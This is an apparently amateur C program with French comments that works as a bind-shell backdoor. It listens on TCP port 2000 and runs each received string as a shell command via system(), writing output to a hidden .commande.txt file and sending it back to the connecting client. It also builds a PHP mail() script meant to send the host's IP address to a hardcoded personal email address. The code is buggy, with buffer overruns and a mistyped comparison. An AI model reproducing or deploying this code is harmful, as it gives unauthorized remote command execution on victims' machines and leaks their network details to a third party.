#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

void envoyerEmail(char *IP);

void envoyerDonnee(int *sock, char *tableau) {
	int i = 0;
	int taille = strlen(tableau)+18;
//	char buffer[taille];
	printf("taille*sizeof(char) = %d", (int)(taille*sizeof(char)));
	char *buffer = malloc(taille*sizeof(char));
	printf("\nTaille de buffer = %d", (int)strlen(buffer));
printf("\n\n1er for() :\n");
	for(i=0; i<strlen(tableau); i++) {
		buffer[i] = tableau[i];
		printf("buffer[%d] = %c   ET   tableau[%d] = %c\n", i, buffer[i], i, tableau[i]);
	}
	char creationFichier[] = " > ./.commande.txt";
printf("\n\n2eme for() :\n");
	for(i=strlen(tableau); i<taille; i++ ) {
		buffer[i] = creationFichier[i-strlen(tableau)];
		printf("buffer[%d] = %c   ET   creationFichier[%d] = %c\n", i, buffer[i], i, creationFichier[i-strlen(tableau)]);
	}
	printf("\n\nTaille = %d\n\n", taille);

	buffer[taille] = '\0';
	printf("buffer = %s\n\n", buffer);
	printf("taille du buffer = %d", (int) strlen(buffer));

        int envoie;




	system(buffer);
	free(buffer);
	FILE *file = fopen(".commande.txt", "r");

        //Pas optimisé (reste en attente d'une meilleur optimisation pour un ta$
        i=0;
        char reponse[2024];
        char ce = fgetc(file);
        while(ce != EOF) {
                reponse[i] = ce;
                i++;
                ce = fgetc(file);
        }
	reponse[i] = '\0';

        fclose(file);

//        remove("./.commande.txt");




        //scanf("Veuillez entrer votre message : %s", &buffer);
        envoie = send(*sock, reponse, sizeof(reponse), 0);
	if(envoie == -1) {printf("Echec de l'envoie"); exit(0);}
        printf("\n");


}

main(){

	system("ifconfig eth0 | grep 'inet ' | tr -s ' ' | cut -c11-23 > .ip.txt");

	FILE *f = fopen(".ip.txt", "r");

	//Pas optimisé (reste en attente d'une meilleur optimisation pour un tableau extensible)
	int i=0;
	char ip[12];
	char c = fgetc(f);
	while(c != EOF) {
		ip[i] = c;
		i++;
		c = fgetc(f);
	}


	fclose(f);

	remove(".ip.txt");

	printf("%s", ip);
envoyerEmail(ip);

	int soc, config, association, ecoute, socClient, fermeture, reception, envoie;

	soc = socket(AF_INET, SOCK_STREAM, 0);
	if(soc== -1){printf("Création de socket échouée, programme terminé"); exit(0);}

	struct sockaddr_in configuration;
	struct sockaddr_in configClient;

	configuration.sin_family = AF_INET;
	configuration.sin_port = htons(2000);
	configuration.sin_addr.s_addr = inet_addr(ip);

	association = bind(soc,(struct sockaddr *) &configuration, sizeof(configuration));

	if(association != -1) printf("\n\nAssociation des parametre réussie\n\n");
	else {printf("Association des parametres échouée, on quitte le programme"); exit(0);}



	ecoute = listen(soc, SOMAXCONN);
	if(ecoute != -1) printf("\n\nActivation de l'écoute réussie\n\n");
	else {printf("Probleme d'écoute");exit(0);}

	printf("\n\nEn attente de connexion ...\n\n");

	socklen_t taille = sizeof(configClient);
	socClient = accept(soc, (struct sockaddr *) &configClient, &taille);

	if(socClient != -1) printf("\n\nConnexion réussie\n\n");
	else printf("\n\nError\n\n");




	//DANS LA CONNEXION
//	char buffer[2024];
char buffer[2024];
char bufferAEnvoyer[2024];
char *t = buffer;

reception = recv(socClient, buffer, 2024, 0);

	while(reception > 0) {

		printf("Contenu du message : %s\n", buffer);
		printf("Taille du buffer reçu (caracteres) = %d", (int)strlen(buffer));
		envoyerDonnee(&socClient, t);
		printf("SocketClient = %d", socClient);
		
		fflush(stdout);

		reception = recv(socClient, buffer, 2024, 0);

	}


	fermeture = close(socClient);
        if(fermeture =! -1) printf("\n\nFermeture de la connexion réussie\n\n");
        else exit(0);


}



void envoyerEmail(char *IP) {

	int i = 0;
	char ip[13];
	//recuperation de l'ip
	for(i=0; i<13; i++) {
		ip[i] = IP[i];
	}
	ip[13] = '\0';


	//system("touch .envoieEmail");
	char t1[] = ("<?php\n\n$destinataire =\"rayane.benhmidane32@hotmail.fr\";\n$email = \"");
	char t2[] = ("\";\n$sujet = \"IMPORTANT\";\n\n\nmail($destinataire,$sujet, $email);\n\n?>;");

printf("\n\nTEST = %s\n\n", ip);

	char texte[strlen(t1)+strlen(t2)+strlen(ip)];

	//Remplissage du texte du futur script
	for(i = 0; i<strlen(t1); i++) {
		texte[i] = t1[i];
	}
	for(i=strlen(t1); i<(strlen(ip)+strlen(t1)); i++ ) {//strlen(t1) = strlen(texte) à ce moment-ci
		texte[i] = ip[i-strlen(t1)];
	}
	for(i=(strlen(t1)+strlen(ip)); i< (strlen(t2)+strlen(ip)+strlen(t1)); i++) {
		texte[i] = t2[i-(strlen(t1)+strlen(ip))];
	}
	texte[strlen(t1)+strlen(t2)+strlen(ip)] = '\0';

	printf("\n\n%s\n\n", texte);


	//Je balance le script dans un fichier
	//char redir[] = " > .envoieEmail.php\0";
	
	//printf("\n\n%s\n\n", redir);
	//system();


}
